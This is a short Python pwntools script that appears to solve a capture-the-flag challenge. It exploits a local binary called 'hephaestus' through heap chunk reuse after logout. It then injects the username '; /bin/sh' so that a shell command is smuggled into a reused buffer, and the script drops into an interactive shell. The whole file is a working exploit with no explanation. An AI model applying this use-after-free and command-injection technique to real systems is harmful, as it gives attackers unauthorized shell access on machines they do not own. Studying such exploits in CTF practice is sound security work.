from pwn import *

p = process("./hephaestus")

def login(username):
    p.sendlineafter("Username: ", username) #malloc username

def setIP(ip):
    p.sendlineafter("3) Logout\n","1")
    p.sendlineafter("IP Address: ", ip) #malloc address

def logout():
    p.sendlineafter("3) Logout\n", "3")
    p.sendlineafter("Quit? (Y/N): ", "N") # free username, free address, top of the freelist is address now

def rce():
    p.sendlineafter("3) Logout\n", "2")

def exploit():
    login("bebas")
    setIP("8.8.8.8")
    logout()
    login("; /bin/sh") #this will malloc-ed on the address of "address" variable
    rce()
    p.interactive()

if __name__ == "__main__":
    exploit()